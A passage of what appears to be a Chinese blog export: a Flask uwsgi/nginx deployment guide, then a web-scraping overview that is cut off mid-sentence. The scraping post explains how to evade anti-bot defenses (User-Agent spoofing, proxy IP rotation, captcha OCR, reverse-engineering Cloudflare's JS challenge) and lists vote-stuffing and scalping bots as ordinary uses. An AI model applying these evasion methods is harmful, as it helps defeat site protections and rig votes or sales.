run:app</span><br></pre></td></tr></table></figure><p>我们来对uwsgi的参数进行分别讲解：</p><ul><li><p>–socket 0.0.0.0:5000：指定端口号为5000。</p></li><li><p>–protocol=http：说明使用 http 协议，即端口5000可以直接使用HTTP请求进行访问。</p></li><li><p>-p 3表示启动的服务占用3个进程。</p></li><li><p>-w run:app：-w 指明了要启动的模块，run 就是项目启动文件 run.py 去掉扩展名，app 是 run.py 文件中的变量 app，即 Flask 实例。</p></li></ul><p>启动完成后，我们可以在任意网络连通的机器上打开浏览器，并访问如下地址： </p><p><a href="http://server_domain_or_ip:5000/">http://server_domain_or_IP:5000</a></p><p>可以看到结果同样如下： </p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200429003343.png" alt="image-20200428170754810"></p><p>至此，我们已经正常使用uwsgi部署了Flask项目。</p><h3 id="使用nginx-uwsgi部署Flask项目"><a href="#使用nginx-uwsgi部署Flask项目" class="headerlink" title="使用nginx + uwsgi部署Flask项目"></a>使用nginx + uwsgi部署Flask项目</h3><p>既然我们已经可以好似用uwsgi来部署Flask项目了，那么我们为什么还要使用Nginx + uwsgi来部署呢？ Nginx是轻量级的高性能Web服务器，提供了诸如HTTP代理和反向代理、负载均衡、缓存等一系列重要特性，在实践之中使用广泛。由C语言编写，执行效率高。</p><p>使用Nginx有如下一些优点：</p><p><strong>安全</strong>：不管什么请求都要经过代理服务器，这样就避免了外部程序直接攻击web服务器</p><p><strong>负载均衡</strong>：根据请求情况和服务器负载情况，将请求分配给不同的web服务器，保证服务器性能</p><p><strong>提高web服务器的IO性能</strong>：对于一些静态文件，可以直接由反向代理处理，不经过web服务器</p><p>那么，应该如何将Nginx与uwsgi结合来部署Flask项目呢？</p><p>在开始讲解Nginx之前，我们首先讲解如何将复杂的uwsgi命令参数保存在配置文件中，从而每次启动uwsgi时，无需添加繁琐的参数，只需要指定配置文件即可。 </p><p>编辑/home/flask_project/uwsgi.ini：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[uwsgi]</span><br><span class="line">module &#x3D; run:app</span><br><span class="line">master &#x3D; true</span><br><span class="line">processes &#x3D; 3</span><br><span class="line">chdir &#x3D; &#x2F;home&#x2F;flask_project</span><br><span class="line">socket &#x3D; &#x2F;home&#x2F;flask_project&#x2F;myproject.sock</span><br><span class="line">socket &#x3D; 127.0.0.1:8000</span><br><span class="line">logto &#x3D; &#x2F;home&#x2F;flask_project&#x2F;myproject.log</span><br><span class="line">chmod-socket &#x3D; 660</span><br><span class="line">vacuum &#x3D; true</span><br></pre></td></tr></table></figure><p>其中，文件参数说明如下： </p><ul><li><p>module相当于之前命令行中的-w参数； </p></li><li><p>processes相当于之前的-p参数； </p></li><li><p>socket此处包含两个，一个是指定了端口，另外指定了一个myproject.sock文件保存socker信息。 </p></li><li><p>chdir是项目路径地址。 </p></li><li><p>logto是日志输出地址。</p></li></ul><p>可以看到，此处我们没有添加–protocol=http对应的配置信息。即我们暴露的端口不能使用HTTP请求直接访问，需要经过Nginx进行反向代理。 执行如下命令来通过配置文件启动uwsgi：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi --ini &#x2F;home&#x2F;flask_project&#x2F;uwsgi.ini</span><br></pre></td></tr></table></figure><p>uwsgi后台运行/背后运行/守护运行的方法:加-d参数，但这种方法使我的log记录到–ini文件中，不知道原因</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uwsgi -d --ini uwsgi.ini </span><br></pre></td></tr></table></figure><p>另一种后台挂载uwsgi方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup uwsgi --ini uwsgi.ini &amp;</span><br></pre></td></tr></table></figure><blockquote><p>PS：Unix/Linux下一般比如想让某个程序在后台运行，很多都是使用 &amp; 在程序结尾来让程序自动运行。比如我们要运行weblogic在后台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;startWebLogic.sh &amp;</span><br></pre></td></tr></table></figure><p>但是加入我们很多程序并不象weblogic一样做成守护进程，可能我们的程序只是普通程序而已，一般这种程序使用 &amp;结尾。但是如果终端关闭，那么程序也会被关闭。但是为了能够后台运行，那么我们就可以使用nohup这个命令，不挂断地运行命令。</p></blockquote><p>此时，我们已经正常启动了uWsgi服务，但是无法直接访问，需要继续部署Nginx服务。</p><p>下面，我们来编辑Nginx的配置文件,一般在/etc/nginx/nginx.conf：</p><p>先将原nginx.conf备份</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &#x2F;etc&#x2F;nginx&#x2F;nginx.conf &#x2F;etc&#x2F;nginx&#x2F;nginx.conf.bak</span><br></pre></td></tr></table></figure><p>修改nginx.conf内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">worker_processes 4;</span><br><span class="line">events &#123; worker_connections 1024; &#125;</span><br><span class="line">http &#123;</span><br><span class="line">    include      mime.types;</span><br><span class="line">    default_type  application&#x2F;octet-stream;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 80;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            include uwsgi_params;</span><br><span class="line">            uwsgi_pass 127.0.0.1:8000;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，如下两行指定反向代理的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include uwsgi_params;</span><br><span class="line">uwsgi_pass 127.0.0.1:8000;</span><br></pre></td></tr></table></figure><p>两个分别指明了代理的解析方式是通过uwsgi解析以及uWsgi的端口地址为127.0.0.1:8000。 </p><p>下面，我们启动Nginx服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>启动完成后，由于nginx本身监听的端口是80端口，因此我们可以直接访问机器地址进行访问，可以看到结果同样如下： </p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200429003343.png" alt="image-20200428170754810"></p><h4 id="PS-nginx的一些操作"><a href="#PS-nginx的一些操作" class="headerlink" title="PS:nginx的一些操作"></a>PS:nginx的一些操作</h4><p>启动:nginx安装目录地址 -c nginx配置文件地址(使用绝对路径)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>停止</p><p>查看进程号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef|grep nginx</span><br></pre></td></tr></table></figure><p>杀死进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -QUIT 进程id</span><br></pre></td></tr></table></figure><p>或者强行停止</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pkill -9 nginx</span><br></pre></td></tr></table></figure><p>重启</p><p>验证nginx配置文件是否正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx -t -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br></pre></td></tr></table></figure><p>看到如下显示说明配置文件正确</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx: the configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf syntax is ok</span><br><span class="line">nginx: configuration file &#x2F;etc&#x2F;nginx&#x2F;nginx.conf test is successful</span><br></pre></td></tr></table></figure><p>重启Nginx服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx -c &#x2F;etc&#x2F;nginx&#x2F;nginx.conf</span><br><span class="line">nginx -s reload </span><br></pre></td></tr></table></figure><p>参考链接：</p><p><a href="https://www.jianshu.com/p/9defe50aa569">https://www.jianshu.com/p/9defe50aa569</a></p><p><a href="https://www.cnblogs.com/franknihao/p/7202253.html">https://www.cnblogs.com/franknihao/p/7202253.html</a></p><p><a href="https://segmentfault.com/a/1190000004294634">https://segmentfault.com/a/1190000004294634</a></p><p><a href="https://www.jianshu.com/p/7301aba92f23">https://www.jianshu.com/p/7301aba92f23</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫经验分享</title>
      <link href="2020/04/27/2020-04-27-Crawler_experience_sharing/"/>
      <url>2020/04/27/2020-04-27-Crawler_experience_sharing/</url>
      
        <content type="html"><![CDATA[<h1 id="大数据时代下爬虫技术的兴起"><a href="#大数据时代下爬虫技术的兴起" class="headerlink" title="大数据时代下爬虫技术的兴起"></a>大数据时代下爬虫技术的兴起</h1><p>最近越来越多的新闻报道，某某公司人员因非法使用爬虫技术被逮捕，利用“爬虫”抓视频网络公司高管获刑……爬虫究竟是合法还是违法的？我只能说，技术是无罪的，但是用到了错的地方代价就是非常巨大的了。言归正传，今天主要给大家讲一下大数据时代下的爬虫技术。</p><p>[TOC]</p><hr><h3 id="一、爬虫基本定义"><a href="#一、爬虫基本定义" class="headerlink" title="一、爬虫基本定义"></a>一、爬虫基本定义</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><p>按我个人的理解，爬虫就是获取互联网<strong>公开数据</strong>的自动化工具。需要指出的是，公开数据，就是网站上公开让用户浏览、获取的数据，而不是通过特殊技术入侵到网站服务器获取的非公开数据。</p><p>简单来说，从某些网站提取出我们感兴趣、有价值的内容，可以是图片、文本，也可以是音乐、视频，但是我们不可能去每一个网页去点去看，然后再复制粘贴保存。所以我们需要一种能自动获取网页内容并可以按照指定规则提取相应内容的程序，这就是爬虫技术。使用爬虫代替人工，减少人工处理的代价。</p><h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><ul><li><p>批量下载保存（小说、音乐、视频、图片） 最基础使用</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428130813.jpg"></p></li><li><p>12306抢票、演唱会门票：</p></li><li><p>网络投票：刷票</p></li><li><p>商品秒杀：618 双11折扣力度大，抢购商品一扫而空，很多人添加到购物车的商品都没有抢到，网速和手速都严重地限制了自己，使用脚本大大提升秒杀成功率。</p></li><li><p>搜索引擎：我们对搜索引擎并不陌生，Google、百度等搜索引擎可能每天都在帮我们快速获得信息。而爬虫就是其中第一步，不断抓取各个网站的网页，存放到搜索引擎的数据库；接着，索引程序读取数据库的网页进行清理，建立倒排索引；最后，搜索程序接收用户的查询关键词，去索引里面找到相关内容，并通过一定的排序算法（Pagerank等）把最相关最好的结果排在最前面呈现给用户。</p></li><li><p>数据获取：比如获得各个机场的实时流量、获得热点城市的火车票情况、各种热门公司招聘中的职位数及月薪分布、某公司的门店变化情况等等信息获取，之后做数据分析处理、机器学习、数据预测等等。</p></li><li><p>信息整合：简单来说就是抓取分散在各个角落的信息，整合后用网站、APP等呈现出来，减少了用户查询的时间。比如大家熟知的去哪儿，整合了各家航空公司的机票价格，方便用户比对哪个航班的价格便宜。各式各样的新闻聚合网站。</p></li></ul><p>了解了爬虫的用途，我们来讲几个相关概念：</p><h4 id="搜索引擎优化SEO"><a href="#搜索引擎优化SEO" class="headerlink" title="搜索引擎优化SEO"></a>搜索引擎优化SEO</h4><p>网站需要搜索引擎爬虫带来<strong>流量</strong>，让更多网站收录自己的站点，于是出现了网站主动进行<strong>搜索引擎优化（SEO, Search Engine Optimization）</strong>，也就是告诉搜索引擎，我这里的内容好，快来抓取吧！</p><h4 id="君子协议robots-txt"><a href="#君子协议robots-txt" class="headerlink" title="君子协议robots.txt"></a>君子协议robots.txt</h4><p>但是又不能让爬虫无限制地爬取，于是产生了一个<strong>君子协议robots.txt</strong>。网站在自己的网站根目录上放上这个文件，告诉爬虫哪些内容可以抓，哪些内容不可以抓；搜索引擎读取网站的robots.txt来知道自己的抓取范围，同时也在访问网站时通过User-Agent来向网站表明自己的身份，比如，Google的爬虫叫做Googlebot，百度的爬虫叫做Baiduspider。</p><h4 id="反爬虫"><a href="#反爬虫" class="headerlink" title="反爬虫"></a>反爬虫</h4><p>但是为了获取数据、获取利益，并不是所有爬虫都遵守君子协议，大量爬虫的行为给网站带来网络带宽、服务器计算力等方面很大的压力，造成不必要的流量浪费和资源消耗。为了降低这种毫无利益的压力和避免自己的数据被他人集中收集，网站通过技术手段来限制爬虫，衍生出众多的反爬虫技术:</p><ul><li><p>使用账户保护数据，数据仅对登录用户可见；</p></li><li><p>数据多次异步加载；</p></li><li><p>限制IP访问频率，甚至封锁IP；</p></li><li><p>输入验证码以获得访问权限；</p></li><li><p>数据在服务器端加密，浏览器端解密；</p></li><li><p>一些产品：Cloudflare Bot Management</p><p>通过将机器学习，Cloudflare 会对每个请求发自机器人的可能性进行评分，利用来自整个 Cloudflare 网络的威胁情报，检测和防范不良机器人。</p></li><li><h6 id="……"><a href="#……" class="headerlink" title="……"></a>……</h6></li></ul><h4 id="反反爬虫"><a href="#反反爬虫" class="headerlink" title="反反爬虫"></a>反反爬虫</h4><p>如何绕过各类网站的反爬虫</p><hr><h3 id="二、爬虫基本流程、原理以及实现方式"><a href="#二、爬虫基本流程、原理以及实现方式" class="headerlink" title="二、爬虫基本流程、原理以及实现方式"></a>二、爬虫基本流程、原理以及实现方式</h3><p>接下来我们来具体讲一下爬虫的基本流程、原理、实现方式</p><h4 id="基本流程"><a href="#基本流程" class="headerlink" title="基本流程"></a>基本流程</h4><p>发起请求——获取响应内容——解析内容——保存数据</p><p><strong>1、发起请求</strong><br>使用http库向目标站点发起请求，即发送一个Request</p><p>Request包含：请求头、请求体等</p><p>（1）常用的请求方式：GET，POST</p><p>get请求的参数直接放在url后：k1=xxx&amp;k2=yyy&amp;k3=zzz，常见的比如查询，像百度wd=。。。</p><p>post请求的参数放在请求体内:存放于form data表单中，常见的比如登陆，会将用户名密码填入表单</p><p>（2）头部信息</p><p>user-agent。比如，你需要得到手机版页面，就要设置浏览器身份标识为手机浏览器的user-agent。</p><p>post请求的参数放在请求体内:存放于form data表单中，常见的比如</p><p><strong>2、获取响应内容</strong><br>如果服务器能正常响应，一般会得到一个网页，里面包含排版文字、图片、视频等数据，是一个丰富内容格式的页面。然而，我通过浏览器查看源代码，看到的却是文本格式的html代码（css/js）。有时候也会返回json、图片、视频等。</p><p>常见响应状态码：</p><p>200：代表访问成功</p><p>301：代表跳转，重定向</p><p>403：请求的资源不允许访问，没有权限</p><p>404：请求的内容不存在</p><p>500：内部服务器错误，可能是暂时的，后面要再次请求试试</p><p>502：网关错误</p><p>503：服务不可用</p><blockquote><p>100-199 用于指定客户端应相应的某些动作。<br>200-299 用于表示请求成功。<br>300-399 用于已经移动的文件并且常被包含在定位头信息中指定新的地址信息。<br>400-499 用于指出客户端的错误。<br>500-599 用于支持服务器错误。</p></blockquote><p><strong>3、解析内容</strong></p><p>解析html数据：正则表达式，第三方解析库如Beautifulsoup，lxml等</p><p>解析json数据：json模块</p><p>解析二进制数据:以b的方式写入文件</p><p><strong>4、保存数据</strong><br>数据库、文件</p><h4 id="爬虫架构"><a href="#爬虫架构" class="headerlink" title="爬虫架构"></a>爬虫架构</h4><p>爬虫分为五个基本构架：</p><ul><li>调度器：相当于一台电脑的CPU，主要负责调度URL管理器、下载器、解析器之间的协调工作。</li><li>URL管理器：包括待爬取的URL地址和已爬取的URL地址，防止重复抓取URL和循环抓取URL，实现URL管理器主要用三种方式，通过内存、数据库、缓存数据库来实现。</li><li>网页下载器：通过传入一个URL地址来下载网页内容</li><li>网页解析器：将下载下来的网页内容进行解析，可以按照我们的要求来提取出我们有用的信息，也可以根据DOM树的解析方式来解析。网页解析器有正则表达式（直观，将网页转成字符串通过模糊匹配的方式来提取有价值的信息，当文档比较复杂的时候，该方法提取数据的时候就会非常的困难），可以使用html.parser 和 beautifulsoup 以及 lxml ，这些都是以 DOM 树的方式进行解析的。</li><li>数据存储器：用于将HTML解析器解析出来的数据通过文件或者数据库形式储存起来</li></ul><h4 id="使用工具"><a href="#使用工具" class="headerlink" title="使用工具"></a>使用工具</h4><p><strong>语言</strong>：python 网页改版、网页封锁变换莫测，昨天写好的爬虫今天可能就不起作用了，我们就需要在最快的时间调试找出问题所在，并以最快的速度修复，使其尽快上线跑起来。所以需要依赖一个快速开发、灵活的语言，同时又有完整丰富的库支撑。而同时具备这些优点的语言，无疑就是Python了。Python的库有多丰富呢，几乎所有你想要的功能Python都有库实现了。在开发过程中，需要什么基本功能，不妨先去搜搜、问问，看看是不是已经有人实现了这个功能，并且上传到pypi上了，而你要做到可能仅仅是pip install。</p><p>要下载网页就用，Python标准模块urllib.request，还有好的没话说的第三方开源模块requests，异步http请求的有aiohttp。要处理网址url就用Python自带的模块urllib.parse。我要解析html就用基于C语言库的高效率模块lxml, 好用的beautifulsoap，正则库re。要管理网址，记录下载成功的、失败的、未下载的各种url的状态，就用Python封装的key-value数据库leveldb。要用成熟的爬虫框架，就用历史悠久的scrapy，后起之秀pyspider。要支持javascript和ajax，就用浏览器模拟框架Selenium。</p><p><strong>爬虫分析利器</strong>：F12 抓包分析</p><p>浏览器的F12快捷键，也可以通过鼠标右键菜单“检查”（Inspect）打开自带的开发者工具，</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428130830.png"></p><pre><code>左上角箭头 用来点击查看网页的元素第二个手机、平板图标 用来模拟移动端显示网页Elements 查看渲染后的网页标签元素。是渲染后（包括异步加载的图片、数据等）的完整网页的html，不是最初下载的那个html。Console 查看JavaScript的console log信息，写网页时比较有用Sources 显示网页源码、CSS、JavaScript代码Network 查看所有加载的请求，对爬虫很有帮助</code></pre><p>爬虫常用的就是1Network，2是清空请求记录，3是保持记录，这在网页有重定向的时候很有用，4是加载这个网页，一共请求了181次。</p><p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428131008.png"></p><p>图中左边红框就是点击的请求网址；绿框就是详情窗口。详情窗口包括，Headers（请求头）、Preview（预览响应）、Response（服务器响应内容）和Timing（耗时）。Preview、Response 帮助我们查看该条请求是不是有爬虫想要的数据；Headers帮助我们在爬虫中重建http请求，以便爬虫得到和浏览器一样的数据。了解和熟练使用F12开发者工具，就如虎添翼可以顺利写出自己的爬虫。</p><p>当然也可以使用bp和fiddler。但对于一般网站的爬取来讲，F12的功能已经足够。</p><h4 id="常见反爬手段"><a href="#常见反爬手段" class="headerlink" title="常见反爬手段"></a>常见反爬手段</h4><p>1.U-A校验、referer校验</p><p>最简单的反爬虫机制应该是U-A校验了。浏览器在发送请求的时候，会附带一部分浏览器及当前系统环境的参数给服务器，这部分数据放在HTTP请求的header部分。只需要爬虫模拟正常浏览器的user-agent即可。python中可以自己找到常见UA随机选取，也可以直接用第三方库fake-useragent。</p><p>referer校验。referer字段可以追溯网站访问来源（一般被称为防盗链），在构造header的时候，传入Referer参数，它的值一般为搜索引擎，或者原网站就可以了。</p><p>2.检测ip、限制访问频率</p><p>一般来说，真人浏览网页的速度相对程序是很慢的，但是爬虫不一样。如果有人一秒钟访问了100次同一个网站，那几乎毫无疑问，这就是爬虫。不过有的人真的是用手在操作页面，手速太快，导致网页都提示 “操作频率太快…”。</p><p>一般来说，面对这种情况，我们有两种办法来解决。</p><p>第一种办法访问慢点。在每次访问完网站之后就设置一个time.sleep，限制访问速度。或者访问时间间隔你可以设定为一个随机值，例如0到10之间的随机秒数。</p><p>第二种方法就是换ip。网站一般是通过ip来识别访问者的身份的，所以我们只要不停地更换ip，就可以伪装成不同的人。通过设置代理ip的办法绕过这个限制。有不少提供免费代理ip的网站，像<a href="https://www.xicidaili.com/nt/%EF%BC%8C%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E4%BB%8E%E7%BD%91%E7%AB%99%E4%B8%8A%E6%8B%BF%E5%88%B0%E5%BE%88%E5%A4%9A%E4%BB%A3%E7%90%86ip%E3%80%82%E4%BD%86%E6%98%AF%E8%BF%99%E4%BA%9Bip%E5%B9%B6%E4%B8%8D%E6%98%AF%E6%AF%8F%E4%B8%AA%E9%83%BD%E8%83%BD%E7%94%A8%E7%9A%84%EF%BC%8C%E6%88%96%E8%80%85%E8%AF%B4%EF%BC%8C%E6%B2%A1%E5%87%A0%E4%B8%AA%E8%83%BD%E7%94%A8%E7%9A%84%E3%80%82%E6%8B%BF%E5%88%B0%E7%9A%84ip%E5%9C%A8%E4%BD%BF%E7%94%A8%E5%89%8D%E6%88%91%E4%BB%AC%E8%BF%98%E9%9C%80%E8%A6%81%E5%AF%B9%E5%85%B6%E8%BF%9B%E8%A1%8C%E6%A3%80%E6%B5%8B%EF%BC%8C%E5%9B%A0%E4%B8%BA%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E5%AE%83%E5%B0%B1%E4%B8%8D%E5%8F%AF%E7%94%A8%E4%BA%86%E3%80%82%E6%89%80%E4%BB%A5%E5%B9%B3%E6%97%B6%E5%A4%9A%E5%82%A8%E5%AD%98%E4%B8%80%E4%BA%9B%E4%BB%A3%E7%90%86ip%EF%BC%8C%E5%85%8D%E5%BE%97%E8%A6%81%E7%94%A8%E7%9A%84%E6%97%B6%E5%80%99%E6%B2%A1%E5%BE%97%E7%94%A8%E3%80%82%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8http://icanhazip.com/">https://www.xicidaili.com/nt/，我们可以从网站上拿到很多代理ip。但是这些ip并不是每个都能用的，或者说，没几个能用的。拿到的ip在使用前我们还需要对其进行检测，因为你不知道什么时候它就不可用了。所以平时多储存一些代理ip，免得要用的时候没得用。可以使用http://icanhazip.com/</a> 这个网站来检测你的代理IP是否设定成功。当你直接使用浏览器访问这个网站的时候，它会返回你的IP地址。</p><p>3.登陆以及验证码</p><p>需要身份验证后才能看到想要的数据，例如很多论坛只有登陆后才可以看到楼主分享的数据。这时候有两种方法解决，一种是携带之前访问成功的cookie持续会话，不过这种会有时限；第二种是模拟登陆表但post账号密码以及其他键值。</p><p>还有些网站，不管你做什么，登录还是访问页面，都需要输入验证码进行验证。在这种情况下，我们必须识别出验证码，才能爬取网站内容。有些简单的字母加数字的验证码可以用ocr进行识别，复杂一点的可以利用机器学习、模板匹配等方法识别，其他一些滑动验证之类的就需要其他的技巧来破解，这里就不详谈了。在登陆的表单基础上中加一个识别出的验证码即可。</p><p>4.蜜罐反爬</p><p>蜜罐这个词，最早是来自于网络攻防中。一方会故意设置一个或者几个服务器，故意留下漏洞，让另一方轻易的入侵进来。这些被故意设置的服务器，就叫做蜜罐。里面可能安装了监控软件，用来监控入侵者。同时，蜜罐还可以拖延入侵者的时间。在反爬虫的机制中，也有一种蜜罐技术。网页上会故意留下一些人类看不到或者绝对不会点击的链接。由于爬虫会从源代码中获取内容，所以爬虫可能会访问这样的链接。这个时候，只要网站发现了有IP访问这个链接，立刻永久封禁该IP + User-Agent + Mac地址等等可以用于识别访问者身份的所有信息。这个时候，访问者即便是把IP换了，也没有办法访问这个网站了。给爬虫造成了非常大的访问障碍。但一般我们写的都是定向爬虫，定向爬虫的爬行轨迹是由我们来决定的，爬虫会访问哪些网址我们都是知道的。因此即使网站有蜜罐，定向爬虫也不一定会中招。</p><p>5.使用ajax异步加载</p><p>站页面是动态页面，采用 Ajax 异步加载数据方式来呈现数据。一般就是网页中查看更多、loadmore这种，一般是用 ajax 异步加载json数据，再渲染到网页中。这时候直接模拟ajax请求，利用json包解析返回的xhr包内容就可以得到想要的内容。但是有些网站把 ajax 请求的所有参数全部加密了。我们根本没办法构造自己所需要的数据的请求，就会遇到基于 JavaScript 的反爬虫手段。</p><p>6.基于 JavaScript 的反爬虫手段</p><p>在响应数据页面之前，先返回一段带有JavaScript 代码的页面，用于验证访问者有无 JavaScript 的执行环境，以确定使用的是不是浏览器。这种反爬虫方法，通常情况下，这段JS代码执行后，会发送一个带参数key的请求，后台通过判断key的值来决定是响应真实的页面，还是响应伪造或错误的页面。因为key参数是动态生成的，每次都不一样，难以分析出其生成方法，使得无法构造对应的http请求。</p><p>面对这种情况，我们也有两种办法来解决。</p><p>第一种方法：可以采用 selenium+phantomJS/geckodriver/chromedriver 框架的方式进行爬取。调用浏览器内核，并利用driver执行 js 来模拟人为操作以及触发页面中的js脚本。从填写表单到点击按钮再到滚动页面，全部都可以模拟，不考虑具体的请求和响应过程，只是完完整整的把人浏览页面获取数据的过程模拟一遍,所以会很慢，也会吃内存。</p><p>第二种方法：就是分析js生成key参数方法，在浏览器中逐步调试js，一步一步逆向分析，找到了key的生成方式，再利用execjs执行js脚本，构造相同动态生成的参数，代入爬虫之中。那此种方法难度较大，cloadflare防护五秒盾就是一个例子，它的cookie里面会包含__cfduid, cf_clearance 这个两个字段，需要对等待5秒的js进行逆向分析，找到其生成字段的方式。</p><p>比较有趣的反爬虫手段：</p><p>去哪儿网用的 <strong>CSS 偏移反爬虫</strong>手段，页面展示的数字和html文件里的数字不一致。<strong>字体反爬</strong>，通过调用自定义的ttf文件来渲染网页中的文字，而网页中的文字不再是文字，而是相应的字体编码，通过复制或者简单的采集是无法采集到编码后的文字内容。</p><p>更多反爬技术可以查看今年刚出的一本书《Python3 反爬虫原理与绕过实战》。</p><p>但其实除了爬取过程中遇到的反爬技术，其他流程中也会遇到大大小小的问题。</p><h4 id="其他常见问题"><a href="#其他常见问题" class="headerlink" title="其他常见问题"></a>其他常见问题</h4><p>1.URL管理</p><p>（1）状态记录</p><p>对于timeout的URL，需要后面再次抓取，所以需要记录所有URL的各种状态，包括：</p><ul><li>已经下载成功</li><li>下载多次失败无需再下载</li><li>正在下载</li><li>下载失败要再次尝试</li></ul><p>增加了对网络请求的各种处理，这个爬虫就健壮多了，不会动不动就异常退出，给后面运维带来很多的工作量。</p><p>（2）清洗去重</p><p>网络请求开始之前，先把url清洗一遍，可以避免重复下载、无效下载，节省服务器和网络开销。</p><p>（3）抓取策略：</p><p>广度优先遍历策略：将新下载网页包含的链接直接追加到待抓取URL队列末尾。即按照树的层次进行搜索，如果此层没有搜索完成，不会进入下一层搜索。</p><img src="https://raw.githubusercontent.com/MambaInVeins/ImageHosting/master/img/20200428131025.jpg" style="zoom:50%;" /><p>深度优先遍历策略：网络爬虫会从起始页开始，一个链接一个链接跟踪下去，处理完这条线路的链接之后，在再转入下一个起始页，继续跟踪链接。</p><p>大站优先策略：对于待抓取URL队列中的所有网页，根据所属的网站进行分类。对于待下载页面数多的网站，优先下载。这个策略也因此叫做大站优先策略。</p><p>反向链接数策略：反向链接数是指一个网页被其他网页链接指向的数量。反向链接数表示的是一个网页的内容受到其他人的推荐的程度。因此，很多时候搜索引擎的抓取系统会使用这个指标来评价网页的重要程度，从而决定不同网页的抓取先后顺序。</p><p>Partial PageRank策略：对于已经下载的网页，连同待抓取URL队列中的URL，形成网页集合，计算每个页面的PageRank值，计算完之后，将待抓取URL队列中的URL按照PageRank值的大小排列，并按照该顺序抓取页面。</p><p>2.清理提取内容：</p><p>从新闻网页的html里面快速、准确提取想要的信息数据，比如标题、发布时间、正文内容等，这又带来内容提取上的难度。</p><p>（1）标题的提取：标题基本上都会出现在html的<title>标签里面</p><p>（2）发布时间提取：一般在<time>标签中，或者使用正则表达式进行匹配提取发布时间</p><p>（3）正文提取：github上有一些现成的库，例如Goose、GNE等，利用节点文本密度实现正文快速采集</p><p>熟练掌握re/beautifulsoup/lxml，熟悉正则、xpath、css提取器。</p><p>3.存储：</p><p>爬虫织网式的爬取，会把每个网站几年前的新闻网页都给翻出来，从而获得海量的网页需要存储。就是存储上的难度。现如今，我们能用的数据库很多，老牌关系型数据库如 MySQL(MariaDB), PostgreSQL 等，新型的NoSQL数据库，还有NewSqL数据库。选择实在太多，但MySQL(Mariadb)从易获取性、易使用性、稳定性、社区活跃性方面都有较大优势，所以，我们在够用的情况下都选择MySQL。PyMySQL是一个纯Python实现的MySQL客户端。因为是纯Python实现，它和Python 3的异步模块aysncio可以很好的结合起来，形成了aiomysql 